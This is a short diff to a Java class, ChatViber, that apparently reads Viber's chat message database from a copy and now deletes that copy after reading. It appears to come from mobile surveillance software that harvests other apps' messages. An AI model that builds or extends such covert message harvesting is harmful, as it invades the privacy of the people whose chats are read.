@@ -127,7 +127,8 @@ public class ChatViber extends SubModuleChat {
 					Check.log(TAG + " (readChatMessages): can read DB");
 				}
 				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-				//SQLiteDatabase db = helper.getReadableDatabase();
+				helper.deleteAtEnd = false;
+				// SQLiteDatabase db = helper.getReadableDatabase();
 
 				groups = new ChatViberGroups();
 
@@ -159,12 +160,14 @@ public class ChatViber extends SubModuleChat {
 						}
 					}
 				}
+				
+				helper.deleteDb();
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
 				}
 			}
-		}catch(Exception ex){
+		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readViberMessageHistory) Error: ", ex);
 			}
